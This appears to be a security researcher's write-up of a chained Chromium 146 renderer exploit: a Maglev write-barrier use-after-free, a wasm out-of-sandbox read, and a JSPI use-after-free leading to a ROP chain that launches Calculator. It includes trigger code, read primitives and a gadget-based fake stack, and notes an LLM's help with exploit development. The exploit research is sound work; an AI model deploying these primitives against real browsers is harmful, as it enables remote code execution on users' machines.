---
title: "Pwning Chromium 146 Renderer Process"
date: 2026-06-11
tags:
  - 1day
  - Chaining
  - RCE
  - Chromium
  - English
  - Security
  - Web
language: en
author: m411k
thumbnail: "/images/thumbnail/pwning_chromium_146.png"
copyright: |
  © 2025 HSPACE (References) Author: Rewrite Lab (m411k)
  This copyright applies to this document only.
---

# PoC

<video controls autoplay muted playsinline preload="auto" poster="/[ENG]%20Pwning%20Chromium%20146%20Renderer%20Process/poc-poster.png">
  <source src="/[ENG]%20Pwning%20Chromium%20146%20Renderer%20Process/poc.mp4" type="video/mp4">
  <a href="/[ENG]%20Pwning%20Chromium%20146%20Renderer%20Process/poc.mov">poc.mov</a>
</video>

# **Prologue**

In this article, we will utilize a chain ([491410818 (CVE-2026-3910)](https://chromium-review.googlesource.com/c/v8/v8/+/7653538), [483092905](https://chromium-review.googlesource.com/c/v8/v8/+/7689399), [485784597](https://chromium-review.googlesource.com/c/v8/v8/+/7607183)) to exploit the V8 engine, hence, the chromium renderer process, this will give you a detailed and general overview of the current state of things in the V8 exploitation realm, especially given the CVE-2026-3910 analysis, one of the few chromium 2026 [in-the-wild](https://chromereleases.googleblog.com/2026/03/stable-channel-update-for-desktop_12.html#:~:text=Google%20is%20aware%20that%20an%20exploit%20for%20CVE%2D2026%2D3910%20exists%20in%20the%20wild.) vulnerabilities.

For this to be helpful for the layman, and not too hefty for the expert, I will try link as much as possible to where that certain concept or idea is explained in a more thorough manner, so don’t hesitate to click.

> 💡 This article was written with zero LLMs help, to keep it’s authentic wacky english human sense, the only help of LLMs was in actual exploitation discussed below

# LLM Stats

Keeping it true to the “[I used AI to exploit X isn’t interpretable without token consumption](https://x.com/seanhn/status/2053844637253558498?s=20)” idiom, the stats is about 1,088,879,489 of GLM5.1 tokens throughout the exploit development process, that sums getting sandboxed R/W (without the initial maglev PoC) part, un-sandboxed read using wasm’s data_segment_starts part, and JSPI UAF successful spray part.

Admittedly I tried to use agents to one-shot the exploit, I failed. And since I apparently wasn’t [the only one](https://www.hacktron.ai/blog/i-let-claude-opus-to-write-me-a-chrome-exploit#:~:text=CVE%2D2026%2D3910%2C%20an%20in%2Dthe%2Dwild%20exploit%2C%20was%20one%20neither%20of%20us%20could%20figure%20out.) that failed in doing so, I think it’s still unachievable (prove me wrong) in the status-quo, nonetheless, as I mentioned, it was able to one shot specific parts of the exploits which bootstrapped my exploit dev experience significantly.

Of course the context had helpful diffs, regression tests, and my tailored guidance, so this number of tokens will need a bit of the reader’s speculation to extract meaningful pointers.

# Part 1: Heap R/W

This is the genesis bug, it’s an oversight made by the [Maglev mid-tier compiler](https://v8.dev/blog/maglev) maintainers, where a [write barrier](https://www.memorymanagement.org/glossary/w.html#term-write-barrier) is not emitted for a heap number while assuming it’s a `Smi`, hence not registering that `HeapNumber` in the [remembered set](https://www.memorymanagement.org/glossary/r.html#term-remembered-set) of an object parent (think `obj.reference = HeapNumber`) that resides in `OldSpace`, and given the`HeapNumber` lives in the `NewSpace`, when a small GC (dubbed “Scavenger”) runs, the `obj.reference` pointer ends up as a dangling pointer, introducing a UAF.

This exact GC mal estado has previously been exploited, [not once](https://issues.chromium.org/issues/392521083), [not twice](https://issues.chromium.org/issues/402032540), so the path to ubercage’s r/w is kinda clear from there, the challenging part for me (not having any prior experience with maglev) was creating the condition where for this exact bug, maglev will not emit the write barrier for a heap pointer, [the patch commit](https://chromium-review.googlesource.com/c/v8/v8/+/7653538) helpfully gives us clear pointers on how we can come to that condition:

```diff
    Merged: [maglev] fix CanElideWriteBarrier Smi recording for phis

    Recording a Tagged use is not enough for 2 reasons:

      * Tagged uses are sometimes ignored, in particular for loop phis
        where we distinguish in-loop and out-of-loop uses.

      * This Tagged use could only prevent untagging of this specific phi,
        but none of its inputs. So we could have a Smi phi as input to the
        current phi which gets untagged and retagged to a non-Smi, all
        while the current phi doesn't get untagged.

diff --git a/src/maglev/maglev-graph-builder.cc b/src/maglev/maglev-graph-builder.cc
index 5fec401b084..f7c2b1575d4 100644
--- a/src/maglev/maglev-graph-builder.cc
+++ b/src/maglev/maglev-graph-builder.cc
@@ -4470,7 +4470,11 @@ bool MaglevGraphBuilder::CanElideWriteBarrier(ValueNode* object,
                                               ValueNode* value) {
   if (value->Is<RootConstant>() || value->Is<ConsStringMap>()) return true;
   if (!IsEmptyNodeType(GetType(value)) && CheckType(value, NodeType::kSmi)) {
-    value->MaybeRecordUseReprHint(UseRepresentation::kTagged);
+    if constexpr (SmiValuesAre31Bits()) {
+      if (Phi* value_as_phi = value->TryCast<Phi>()) {
+        value_as_phi->SetUseRequires31BitValue();
+      }
+    }
     return true;
   }

```

Before tackling each point, a bit of glossary definitions won’t kill anyone.

## Lexicon

### (Un)Tagging

In V8, a value is either tagged (LSB is set) which signifies a pointer, or untagged (LSB is not set) which signifies a Smi (Small integer), this enables a significance performance optimization coined [pointer compression](https://v8.dev/blog/pointer-compression), and in a two birds, one stone fashion, it enables a security boundary called [V8 sandbox](https://v8.dev/blog/sandbox), one of the rare cases where optimization and security get along with each other.

### Phis (_Φ)_

Since maglev utilizes a [Static single-assignment](https://en.wikipedia.org/wiki/Static_single-assignment_form) [CFG](https://en.wikipedia.org/wiki/Control-flow_graph), it inherits _Φ_ concept from SSA, it’s a function (and a node at the same time in maglev) that roughly translates “my value is one of my two inputs”, it appears in loops and conditional branches, it’s the state merge between two [basic blocks](https://en.wikipedia.org/wiki/Basic_block) basically.

### Phi Representation Selection

This is a pass from the minimal passes maglev [has](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/maglev/maglev-compiler.cc;l=91-220) (and temporary [disabled](https://chromium-review.googlesource.com/c/v8/v8/+/7653638), and [reenabled again](https://chromium-review.googlesource.com/c/v8/v8/+/7899697)), it chooses if we’re able to untag a certain Phi, thus eliminating -depending on the scenario- the need to retag it’s inputs (for example if the input is an `Int32` , or `Float64` node), or to tag it’s outputs, the implementation is in `v8/src/maglev/maglev-phi-representation-selector.cc/.h`, and previously to this bug, many more we’re found and explained in different talks (cf. “[The Hat Trick: Exploit Chrome Twice from Runtime to JIT](https://i.blackhat.com/BH-US-23/Presentations/US-23-Wang-The-Hat-Trick-Exploit-Chrome-Twice-from-Runtime-to-JIT.pdf)”, “[Reviving JIT Vulnerabilities: Unleashing the Power of Maglev Compiler Bugs on Chrome Browser](https://i.blackhat.com/EU-23/Presentations/EU-23-Liu-Reviving-JIT-Vulnerabilities.pdf)”).

## Sink

With that aside let’s explore where the two commit message points manifest in code.

```
  * Tagged uses are sometimes ignored, in particular for loop phis
    where we distinguish in-loop and out-of-loop uses.
```

Every Phi node tracks it’s different representations used by nodes it dominates, and for phi representation selection, having a `Tagged` in `use_reprs` forbids that certain phi from getting untagged.

```cpp
  if (use_reprs.contains(UseRepresentation::kTagged) ||
      use_reprs.contains(UseRepresentation::kUint32) || use_reprs.empty()) {
    // We don't untag phis that are used as tagged (because we'd have to retag
    // them later). We also ignore phis that are used as Uint32, because this is
    // a fairly rare case and supporting it doesn't improve performance all that
    // much but will increase code complexity.
    TRACE_UNTAGGING("  => Leaving tagged [incompatible uses]");
    EnsurePhiInputsTagged(node);
    return default_result;
  }
```

The twist is that for loop phis, the only use representations counted are the uses inside the loop:

```cpp
  UseRepresentationSet use_reprs;
  // Since TruncatedInt32 is not reversible, we should always consider all uses.
  if (node->is_loop_phi() && !node->same_loop_use_repr_hints().empty() &&
      !node->same_loop_use_repr_hints().contains_only(
          UseRepresentation::kTruncatedInt32)) {
    // {node} is a loop phi that has uses inside the loop; we will tag/untag
    // based on those uses, ignoring uses after the loop.
    use_reprs = node->same_loop_use_repr_hints();
    TRACE_UNTAGGING("  + use_reprs : " << use_reprs << " (same loop only)");
  } else {
    use_reprs = node->use_repr_hints();
    TRACE_UNTAGGING("  + use_reprs  : " << use_reprs << " (all uses)");
  }
```

So this important insight has to be taken into consideration in the rest of the maglev’s codebase.

But it wasn’t.

The previous way to sort of enforce the phi node to stay a Smi, was by recording a tagged use (`value->MaybeRecordUseReprHint(UseRepresentation::kTagged);`), this tagged record, although it transcends parent Phis (note `[1]` below):

```cpp
void ValueNode::MaybeRecordUseReprHint(UseRepresentationSet repr_mask) {
  if (Phi* phi = TryCast<Phi>()) {
    phi->RecordUseReprHint(repr_mask);
  }
  if (CallKnownJSFunction* call = TryCast<CallKnownJSFunction>()) {
    // std::cout << "Recording UseRepr hint for call : " << repr_mask << "\n";
    call->RecordUseReprHint(repr_mask);
  }
}
```

```cpp
void Phi::RecordUseReprHint(UseRepresentationSet repr_mask,
                            bool force_same_loop) {
  // {force_same_loop} is used when recomputing hints after the initial graph
  // build, as {is_unmerged_loop_phi()} is no longer a reliable indicator of
  // whether a use is inside the same loop.
  if (is_loop_phi() && (is_unmerged_loop_phi() || force_same_loop)) {
    same_loop_use_repr_hints_.Add(repr_mask);
  }

  if (!repr_mask.is_subset_of(use_repr_hints_)) {
    use_repr_hints_.Add(repr_mask);

    // Propagate in inputs, ignoring unbounded loop backedges.
    int bound_inputs = input_count();
    if (merge_state()->is_unmerged_loop()) --bound_inputs;

    for (int i = 0; i < bound_inputs; i++) {
      if (Phi* phi_input = input(i).node()->TryCast<Phi>()) {
        phi_input->RecordUseReprHint(repr_mask); // <--- [1]
      }
    }
  }
}
```

```
  * This Tagged use could only prevent untagging of this specific phi,
    but none of its inputs. So we could have a Smi phi as input to the
    current phi which gets untagged and retagged to a non-Smi, all
    while the current phi doesn't get untagged.
```

For at least, this phrase is kind-of vague, because as we established, if a tagged use is registered in a phi, it transcends to it’s input phi, and since that “Smi phi” will have a tagged use, it will not be untagged, but given the first more important point, the statement still eludes to how we can write a PoC for this.

By having a normal Smi typed (i.e. `CheckType(value, NodeType::kSmi) == true`) phi, that has a Smi **loop** phi as input, and since that input phi will be untagged, exactly to `Int32`, it doesn’t inherently have a constraint on surpassing `Smi` range ($2**30-1$), other than it’s type range ($2**32-1$), hence when it will be later re-tagged, in the case where it surpassed Smi range, it will be canonicalized to a `HeapNumber`, and that’s without a non-emitted write barrier of course.

## Source

So how can we formulate that in JS? said simply it’s:

```jsx
function foo(b, x) {
  let y = 0;
  while (y <= x) y++;
  let z = b ? y : 1;
  obj.a = z;
  return obj.a;
}
```

Yeah, that’s all you need to get a dangling pointer, when `x` is `SMI_MAX` it’s not gonna deopt -because it’s still a Smi-, but what will happen to `y`? it’s gonna read `SMI_MAX + 1`, the loop has `<=` ⇒ `x + 1` iterations, that’s in `Int32` (what `y` phi will be untagged to) range, and when it’s converted to to a number `Int32ToNumber` it’s gonna become a `HeapNumber` at runtime, flowing still through `StoreTaggedFieldNoWriteBarrier`, here is some selected snippet’s of the maglev graph that will make the point a bit clearer:

```
----- After graph building -----
...
      3: InitialValue(a1), // <-- this is x
...
     11: CheckedSmiUntag [n3] // The only deopt check is on x SMIness
...
│╭─►Block b3 peeled (effects:)
││   22: φᵀ r0 (n21, n29)
││   23: CheckedSmiUntag [n22]
││   24: Int32Compare(LessThanOrEqual) [n23, n11]
││╭──25: BranchIfInt32Compare(LessThanOrEqual) [n23, n11] b4 b5
│││   ↓
│││ Block b4
│││  26: Int32IncrementWithOverflow [n23]
│││  27: ReduceInterruptBudgetForLoop(10) [n17]
│││  29: Int32ToNumber [n26]
│╰─◄─28: JumpLoop b3
│ │
│ ╰►Block b5
...
 │    ▼
 ╰─►Block b7
     32: φᵀ r0 (n9, n22)
╭────33: BranchIfToBooleanTrue [n2] b8 b9
│     ↓
...
 │    ▼
 ╰─►Block b10
     36: φᵀ <accumulator> (n32, n21), 2 uses
     38: StoreTaggedFieldNoWriteBarrier(0xc: 0x237f000034f5 <String[1]: #a>) [n37, n36]
...
```

Please don’t focus on the code flow, I’ve removed a lot of important nodes and information, I just want you to have the mental model of node 38 (`obj.a = z`) ⇒ Phi 36 (`b ? y : 1;`) ⇒ Phi 32 (`let y = 0; || while (y <= x) y++;` -first iteration is peeled-) ⇒ Phi 22 (`while (y <= x) y++;`), for now Phi 22 is tagged, and it’s SMIness is correctly checked (`23: CheckedSmiUntag`), but notice what happens after Phi untagging pass:

```
MaglevPhiRepresentationSelector
Considering for untagging: n22 type=Number
  + node->is_loop_phi() : 1
  + node->same_loop_use_repr_hints() : {Int32}
  + node->use_repr_hints() : {Tagged, Int32}
  + use_reprs : {Int32} (same loop only)
  + input_reprs: {Int32}
Untagging kinds: {SmiConstant, Conversion}
  + intersection reprs: {Int32}
  => Untagging to Int32
    @ Input 0 (n21): Making Int32 instead of Smi
    @ Input 1 (n29): Bypassing conversion
Considering for untagging: n32 type=Smi
  + node->is_loop_phi() : 0
  + node->same_loop_use_repr_hints() : {}
  + node->use_repr_hints() : {Tagged}
  + use_reprs  : {Tagged} (all uses)
  + input_reprs: {Int32}
Untagging kinds: {SmiConstant, UntaggedPhi}
  => Leaving tagged [incompatible uses]
  0x10000f4dbb0  n41: Int32ToNumber [n22], 0 uses 🪦
Considering for untagging: n36 type=Smi
  + node->is_loop_phi() : 0
  + node->same_loop_use_repr_hints() : {}
  + node->use_repr_hints() : {Tagged}
  + use_reprs  : {Tagged} (all uses)
  + input_reprs: {Int32}
Untagging kinds: {KnownSmi, SmiConstant}
  => Leaving tagged [incompatible uses]

----- After Phi untagging -----
...
     11: CheckedSmiUntag [n3], 4 uses, cannot truncate to int32
...
│     ▼
│╭─►Block b3 peeled (effects:)
││   22: φᴵ r0 (n16, n26)
││   24: Int32Compare(LessThanOrEqual) [n22, n11], 0 uses 🪦
││╭──25: BranchIfInt32Compare(LessThanOrEqual) [n22, n11] b4 b5
│││   ↓
...
│││  26: Int32IncrementWithOverflow [n22], 3 uses, cannot truncate to int32
...
│││  29: Int32ToNumber [n26], 0 uses 🪦
│╰─◄─28: JumpLoop b3
...
│ │
│ ╰►Block b5
│    41: Int32ToNumber [n22], 1 uses
...
 │    ▼
 ╰─►Block b7
     32: φᵀ r0 (n9, n41)
╭────33: BranchIfToBooleanTrue [n2] b8 b9
...
 │    ▼
 ╰─►Block b10
     36: φᵀ <accumulator> (n32, n21)
     38: StoreTaggedFieldNoWriteBarrier(0xc: 0x237f000034f5 <String[1]: #a>) [n37, n36]
```

Phi 22 became an `Int32`, `CheckedSmiUntag` is gone, no inherent SMIness requirement.

<aside>
💡

The graphs given here are extracted from specific V8 debugging flags, namely these:

```
./chromium/src/out/Default/d8 --allow-natives-syntax --trace-deopt  --trace-maglev-graph-building --trace-maglev-phi-untagging --print-maglev-graphs --expose-gc -e '...'
```

</aside>

This is completely different with the patch applied:

```diff
+    if constexpr (SmiValuesAre31Bits()) {
+      if (Phi* value_as_phi = value->TryCast<Phi>()) {
+        value_as_phi->SetUseRequires31BitValue();
+      }
+    }
```

This sets the 31 bit value use flag, and this is actually respected by all Phi’s untagging decision (unless of course this variant is broken somewhere deep in the weeds), here is how the graph looks now:

```diff
----- After graph building -----
...
│╭─►Block b3 peeled (effects:)
││   22: φᵀⁱ r0 (n21, n29), 3 uses
││    4 : 79 f9 01 00       TestLessThanOrEqual r0, EmbeddedFeedback[0x1]
││       ↱ eager @4 (6 live vars)
││   23: CheckedSmiUntag [n22], 3 uses, cannot truncate to int32
││   24: Int32Compare(LessThanOrEqual) [n23, n11], 0 uses 🪦
││    8 : a6 0b             JumpIfFalse [11]
││╭──25: BranchIfInt32Compare(LessThanOrEqual) [n23, n11] b4 b5
│││   ↓
│││ Block b4
│││  12 : 59 00             Inc FBV[0]
│││      ↱ eager @4 (6 live vars)
│││  26: Int32IncrementWithOverflow [n23], 2 uses, cannot truncate to int32
│││  15 : 95 0d 00 01       JumpLoop [13], [0], FBV[1]
│││  27: ReduceInterruptBudgetForLoop(10) [n17]
│││      ↳ lazy @15 (5 live vars)
│││  29: Int32ToNumber [n26], 1 uses
│╰─◄─28: JumpLoop b3
...
 │    ▼
 ╰─►Block b7
     32: φᵀⁱ r0 (n9, n22), 1 uses
...
 │    ▼
 ╰─►Block b10
     36: φᵀⁱ <accumulator> (n32, n21), 2 uses
     37 : 39 f7 01 02       SetNamedProperty r2, [1:"a"], FBV[2]
     38: StoreTaggedFieldNoWriteBarrier(0xc: 0x1524000034f5 <String[1]: #a>) [n37, n36]

```

You’re gonna notice the small `i` in (`22: φᵀⁱ`), that’s the 31 bits use flag, here is how it plays a role during Phi untagging:

```diff
MaglevPhiRepresentationSelector
Considering for untagging: n22 type=Number
  + node->is_loop_phi() : 1
  + node->same_loop_use_repr_hints() : {Int32}
  + node->use_repr_hints() : {Int32}
  + use_reprs : {Int32} (same loop only)
  + input_reprs: {Int32}
Untagging kinds: {SmiConstant, Conversion}
  + intersection reprs: {Int32}
  => Untagging to Int32
    @ Input 0 (n21): Making Int32 instead of Smi
    @ Input 1 (n29): Bypassing conversion
Considering for untagging: n32 type=Smi
  + node->is_loop_phi() : 0
  + node->same_loop_use_repr_hints() : {}
  + node->use_repr_hints() : {}
  + use_reprs  : {} (all uses)
  + input_reprs: {Int32}
Untagging kinds: {SmiConstant, UntaggedPhi}
  => Leaving tagged [incompatible uses]
  0x12000f8dbb0  n41: Int32ToNumber [n22], 0 uses 🪦
Considering for untagging: n36 type=Smi
  + node->is_loop_phi() : 0
  + node->same_loop_use_repr_hints() : {}
  + node->use_repr_hints() : {}
  + use_reprs  : {} (all uses)
  + input_reprs: {Int32}
Untagging kinds: {KnownSmi, SmiConstant}
  => Leaving tagged [incompatible uses]

----- After Phi untagging -----
...
╭────13: BranchIfInt32Compare(LessThanOrEqual) [n10, n11] b2 b6
│     ↓
│   Block b2
│  0x15240101e335 <SharedFunctionInfo foo> (0x15240101f18d <String[7]: "unnamed">:4:2)
│    15 : 95 0d 00 01       JumpLoop [13], [0], FBV[1]
│    18: ReduceInterruptBudgetForLoop(10) [n17]
│        ↳ lazy @15 (5 live vars)
│    20: Jump b3
│     │  with gap moves:
│     │    - n16 → 22: φᴵⁱ r0
│     ▼
│╭─►Block b3 peeled (effects:)
││   22: φᴵⁱ r0 (n16, n26), 3 uses
││    4 : 79 f9 01 00       TestLessThanOrEqual r0, EmbeddedFeedback[0x1]
││       ↱ eager @4 (6 live vars)
││   23: CheckedSmiSizedInt32 [n22], 3 uses, cannot truncate to int32
...
│││  26: Int32IncrementWithOverflow [n23], 3 uses, cannot truncate to int32
│││  15 : 95 0d 00 01       JumpLoop [13], [0], FBV[1]
│││  27: ReduceInterruptBudgetForLoop(10) [n17]
│││      ↳ lazy @15 (5 live vars)
│││  29: Int32ToNumber [n26], 0 uses 🪦
│╰─◄─28: JumpLoop b3
│ │      with gap moves:
│ │        - n26 → 22: φᴵⁱ r0
│ │
│ ╰►Block b5
│    41: Int32ToNumber [n22], 1 uses
...
 ╰─►Block b7
     32: φᵀⁱ r0 (n9, n41), 1 uses
...
 │    ▼
 ╰─►Block b10
     36: φᵀⁱ <accumulator> (n32, n21), 2 uses
     37 : 39 f7 01 02       SetNamedProperty r2, [1:"a"], FBV[2]
     38: StoreTaggedFieldNoWriteBarrier(0xc: 0x1524000034f5 <String[1]: #a>) [n37, n36]
...
```

Notice how `23: CheckedSmiSizedInt32` is there, that’s `ⁱ` effect:

```cpp
  if (phi->uses_require_31_bit_value() &&
      old_untagging->Is<CheckedSmiUntag>()) {
    // CheckedSmiUntag serves a dual-purpose: it untags a Smi but it also
    // ensures that this value is a Smi (and is therefore in Smi range). We need
    // to make sure to preserve both of these aspects.
    DCHECK_EQ(to_repr, ValueRepresentation::kInt32);
    switch (from_repr) {
      case ValueRepresentation::kInt32:
        old_untagging->OverwriteWith<CheckedSmiSizedInt32>();
        break;
```

## Exploitation

Exploitation is fairly simple, you need to trigger a major GC so the object get’s moved to the old generation, then after running the function with `SMI_MAX`, a minor GC will be sufficient so that the `HeapNumber` is moved to `To` space (from `From` space), and the pointer is stale now.

Then we spray a string so we can get OOB read (this is inspired from a [303f06e3’s bug report](https://issues.chromium.org/issues/402032540#:~:text=However%2C%20I%27ve%20now%20discovered%20a%20more%20elegant%20exploitation%20strategy%3A%20Leveraging%20V8%27s%20static%2Droots%20to%20bypass%20ASLR.%20In%20V8%2C%20addresses%20of%20certain%20frequently%20used%20objects%20remain%20constant.%20For%20example%3A%0AThe%20Map%20pointer%20for%20SeqOneByteString%20objects%20is%20always%20fixed%20at%200xb5)), we search using it for a sentinel in a FixedArray, and afterwards we replace the spray with the leaked forged (with our new length) JSArray array data, then after we verify the corrupted array length, we create `addrof`, `R/W32` primitives, the method to do so is documented too much to repeat in here.

# Part 2: Out-of-sandbox Read

## Context

Well for now, since we’re still in the [V8 ubercage](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit), we have only compressed pointers for now, and the vow of the sandbox is for no out-of-sandbox write, not reads! at least for now(?).

So it’s easier to find such out-of-sandbox reads instances, the one we utilized here is an instance where `data_segment_starts`, `data_segment_sizes` `WasmTrustedInstanceData` fields are actually still were living in the sandbox, the `data_segment_starts` struct actually stores unsandboxed pointers, and from it wasm’s `mem.buffer` memcopy’s from the content it points to, since this bug is a bit clearer, I was successful in slopping it, especially the trusted tables ([EPT/TPT/etc…](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0#heading=h.fg3qxf1x0p2q)) pointers extraction part.

## Exploitation

The relevant part of the exploit is straightforward:

```jsx
const wb = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  // ...
  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
]);
const g = new WebAssembly.Global({ value: "i32", mutable: true }, 0x1337);
const inst = new WebAssembly.Instance(new WebAssembly.Module(wb), {
  env: { g },
});
const mem = inst.exports.mem;
const minit = inst.exports.init;

function rwm32(o) {
  return new DataView(mem.buffer).getUint32(o, true);
}
function rwm64(o) {
  const d = new DataView(mem.buffer);
  return d.getUint32(o + 4, true) * 0x100000000 + d.getUint32(o, true);
}

let INST = addrof(inst);
let TDH = sandboxedRead32(INST + 12);
console.log("[*] WasmInstanceObject sbx=" + hex(INST) + " handle=" + hex(TDH));

function findDataSegmentArrays() {
  // ...
}

const found = findDataSegmentArrays();
let DSS = found.dss,
  DSSZ = found.dssz;

function unsandboxedRead32(addr) {
  sandboxedWrite32(DSS + 8, addr >>> 0);
  sandboxedWrite32(DSS + 12, Math.floor(addr / 0x100000000) >>> 0);
  sandboxedWrite32(DSSZ + 8, 4);
  minit(0, 0, 4);
  return rwm32(0);
}
function unsandboxedRead64(addr) {
  sandboxedWrite32(DSS + 8, addr >>> 0);
  sandboxedWrite32(DSS + 12, Math.floor(addr / 0x100000000) >>> 0);
  sandboxedWrite32(DSSZ + 8, 8);
  minit(0, 0, 8);
  return rwm64(0);
}
function unsandboxedReadBuf(addr, size) {
  sandboxedWrite32(DSS + 8, addr >>> 0);
  sandboxedWrite32(DSS + 12, Math.floor(addr / 0x100000000) >>> 0);
  sandboxedWrite32(DSSZ + 8, size);
  minit(0, 0, size);
  return new Uint8Array(mem.buffer, 0, size).slice();
}
```

# Part 3: RCE

## Context

The icing on the cake is this last bug, and it’s yet another UAF bug, the regress test on the commit made my life way easier trying to exploit it:

```
commit 54cf5fa964f0734a8277ea2837aa2e4168e3240a
Author: Thibaud Michaud <thibaudm@chromium.org>
Date:   Wed Feb 25 15:13:51 2026 +0100

    [jspi] Clear EPT entry on stack return

    Once the stack returns and is moved to the stack pool, it may be freed
    at any point depending on the pool capacity and memory pressure. The
    owning trusted WasmSuspenderObject should be unreachable at this point,
    but using a sandbox corruption, the object can be kept alive and reused.
    Clear the EPT entry on return to avoid a use after free.

    R=jkummerow@chromium.org

    Fixed: 485784597
    Change-Id: I6be6970188ea187ebad705eaf9aa21e0f6833df9
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7607183
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#105457}

...
diff --git a/test/mjsunit/sandbox/wasm-jspi-uaf.js b/test/mjsunit/sandbox/wasm-jspi-uaf.js
new file mode 100644
index 000000000000..a09252d98b01
--- /dev/null
+++ b/test/mjsunit/sandbox/wasm-jspi-uaf.js
@@ -0,0 +1,35 @@
+// Copyright 2026 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --sandbox-testing --expose-gc
+
+d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
+d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');
+
+let builder = new WasmModuleBuilder();
+let resolve0;
+let promises = [new Promise(r => { resolve0 = r; }),
+                new Promise(r => setTimeout(r, 0))];
+let suspend0 = new WebAssembly.Suspending(() => promises[0]);
+let suspend0_index = builder.addImport("m", "suspend0", kSig_v_v);
+let suspend1 = new WebAssembly.Suspending(() => promises[1]);
+let suspend1_index = builder.addImport("m", "suspend1", kSig_v_v);
+function corrupt() {
+  set_suspender(
+      get_resume_data(promises[0]),
+      get_suspender(get_resume_data(promises[1])));
+}
+let corrupt_index = builder.addImport("m", "corrupt", kSig_v_v);
+builder.addExport("suspend0", suspend0_index);
+builder.addExport("suspend1", suspend1_index);
+builder.addExport("corrupt", corrupt_index);
+let instance = builder.instantiate({m: {suspend0, suspend1, corrupt}});
+
+WebAssembly.promising(instance.exports.suspend0)();
+WebAssembly.promising(instance.exports.suspend1)()
+  .then(v => {
+    gc({type:'major', execution:'sync', flavor:'last-resort'});
+    resolve0();
+  });
+instance.exports.corrupt();

```

The UAF is manifested where `StackMemory` (a trusted struct used by each [JSPI](https://v8.dev/blog/jspi) promise(?)), is freed but still it’s EPT entry is still stale, and the owning `WasmSuspenderObject` instance can still be retrieved and reused for another promise (all external references are just index to trusted tables after all), this memory struct has an appetizing struct called `JumpBuffer`, it’s fields are all what you want to see:

```cpp
struct JumpBuffer {
  Address sp;
  Address fp;
  Address pc;
  // ...
}
```

So by spraying `JumpBuffer`'s over the freed `StackMemory` space we intuitively get code execution.

`JumpBuffer` struct, and JSPI usage in general in sandbox escape has previously [been demonstrated](https://issues.chromium.org/issues/404285918) many times, and this is just another interesting slip-up.

## Exploitation

Since this gets us SP/PC control, it’s just a matter of gathering gadgets (we can get binary base from `IsolateData` trivially leaked from the previous out-of-sandbox read primitive) and profit.

I used a mundane `fork() -> execve()` ROP chain instead of directly `execve` since chromium seems to kill any process (now Calculator) that fails to communicate with the Mojo IPC (that’s just my llm’s speculation, I am not an IPC guy).

```jsx
TARGET_PC = BigInt(BINARY_BASE) + 0xb725n; // pop rax; ret (first: set rax=fork)
const POP_RDI_RET = BINARY_BASE + 0x9756b;
const POP_RSI_RET = BINARY_BASE + 0x61120;
const XOR_EDX_EDX_RET = BINARY_BASE + 0x4db91;
const POP_RAX_RET = BINARY_BASE + 0xb725;
const SYSCALL_GADGET = BINARY_BASE + 0x51cca;
const SYSCALL_RET_GADGET = BINARY_BASE + 0x26e5eb;
// ...
fakeStack[0] = u2f(0x02000002, 0); // fork (SYSCALL_CLASS_UNIX<<24 | 2)
fakeStack[1] = addr2dbl(SYSCALL_RET_GADGET); // syscall; ...; pop rbp; ret
fakeStack[2] = 0; // dummy for pop rbp
fakeStack[3] = addr2dbl(POP_RDI_RET); // pop rdi; ret
// fakeStack[4] set at runtime (rdi = string addr)
fakeStack[5] = addr2dbl(POP_RSI_RET); // pop rsi; ret
// fakeStack[6] set at runtime (rsi = argv addr)
fakeStack[7] = addr2dbl(XOR_EDX_EDX_RET); // xor edx, edx; ret
fakeStack[8] = addr2dbl(POP_RAX_RET); // pop rax; ret
fakeStack[9] = u2f(0x0200003b, 0); // execve (SYSCALL_CLASS_UNIX<<24 | 59)
fakeStack[10] = addr2dbl(SYSCALL_GADGET); // syscall (no ret — execve won't return)
fakeStack[20] = u2f(0x7273752f, 0x6e69622f); // "/usr/bin"
fakeStack[21] = u2f(0x65706f2f, 0x0000006e); // "/open\0..."
fakeStack[22] = u2f(0x0000612d, 0x00000000); // "-a\0..."
fakeStack[23] = u2f(0x636c6143, 0x74616c75); // "Calculato"
fakeStack[24] = u2f(0x0000726f, 0x00000000); // "or\0..."
// ...
WebAssembly.promising(jspiInstance.exports.suspend0)();
WebAssembly.promising(jspiInstance.exports.suspend1)().then((v) => {
  console.log("[*] suspend1 resolved, triggering GC to free stack...");
  gc({ type: "major", flavor: "last-resort" });
  console.log("[+] GC done, stack should be freed");
  // ...

  // Navigate to FixedDoubleArray data area for fake stack
  const arrSbx = addrof(fakeStack);
  const elTagged = sandboxedRead32(arrSbx + 8);
  const dataSbxOff = elTagged - 1 + 8;
  FAKE_SP_LO = BigInt(SANDBOX_BASE) + BigInt(dataSbxOff);
  FAKE_STACK_LIMIT = FAKE_SP_LO;
  console.log(
    "[+] FAKE_SP -> FixedDoubleArray data at sandbox+" +
      hex(dataSbxOff) +
      " = " +
      hex64(Number(FAKE_SP_LO)),
  );

  // Set runtime-dependent addresses (fakeStack moved by GC, addresses now known)
  const stkBase = Number(FAKE_SP_LO);
  fakeStack[4] = addr2dbl(stkBase + 20 * 8); // rdi -> "/usr/bin/open"
  fakeStack[6] = addr2dbl(stkBase + 30 * 8); // rsi -> argv array
  fakeStack[30] = addr2dbl(stkBase + 20 * 8); // argv[0] = "/usr/bin/open"
  fakeStack[31] = addr2dbl(stkBase + 22 * 8); // argv[1] = "-a"
  fakeStack[32] = addr2dbl(stkBase + 23 * 8); // argv[2] = "Calculator"
  fakeStack[33] = 0; // argv[3] = NULL
  // ...
});
// ...
```

